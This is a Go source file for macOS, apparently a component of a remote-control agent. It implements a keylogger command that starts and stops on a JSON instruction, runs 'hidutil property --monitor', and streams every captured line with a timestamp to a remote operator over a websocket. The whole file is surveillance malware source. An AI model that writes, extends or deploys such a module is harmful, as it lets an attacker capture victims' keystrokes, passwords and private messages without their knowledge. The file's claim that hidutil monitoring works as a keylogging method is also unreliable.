//go:build darwin

package main

import (
	"bufio"
	"context"
	"encoding/json"
	"os/exec"
	"strings"
	"sync"
	"time"
)

var (
	keylogMu     sync.Mutex
	keylogCancel context.CancelFunc
)

func execKeylog(payload json.RawMessage) map[string]any {
	var p struct {
		Action string `json:"action"`
	}
	_ = json.Unmarshal(payload, &p)

	if p.Action == "stop" {
		keylogMu.Lock()
		if keylogCancel != nil {
			keylogCancel()
			keylogCancel = nil
		}
		keylogMu.Unlock()
		return map[string]any{"status": "stopped"}
	}

	keylogMu.Lock()
	if keylogCancel != nil {
		keylogCancel()
	}
	ctx, cancel := context.WithCancel(context.Background())
	keylogCancel = cancel
	keylogMu.Unlock()

	go runKeylogDarwin(ctx)

	return map[string]any{"status": "started", "method": "hidutil"}
}

func runKeylogDarwin(ctx context.Context) {
	debugLog.Printf("[keylog] started (macOS hidutil)")
	defer debugLog.Printf("[keylog] stopped")

	// macOS doesn't have /dev/input. Use hidutil property --monitor as a fallback.
	// Note: requires Accessibility permissions.
	cmd := exec.CommandContext(ctx, "hidutil", "property", "--monitor")
	stdout, err := cmd.StdoutPipe()
	if err != nil {
		wsSend("stream_frame", map[string]any{
			"stream": "keylog",
			"error": "hidutil not available: " + err.Error(),
		})
		return
	}

	if err := cmd.Start(); err != nil {
		wsSend("stream_frame", map[string]any{
			"stream": "keylog",
			"error": "failed to start hidutil: " + err.Error(),
		})
		return
	}

	scanner := bufio.NewScanner(stdout)
	for scanner.Scan() {
		select {
		case <-ctx.Done():
			return
		default:
		}
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}
		wsSend("stream_frame", map[string]any{
			"stream": "keylog",
			"raw": line,
			"timestamp": time.Now().Format(time.RFC3339Nano),
		})
	}

	cmd.Wait()
}
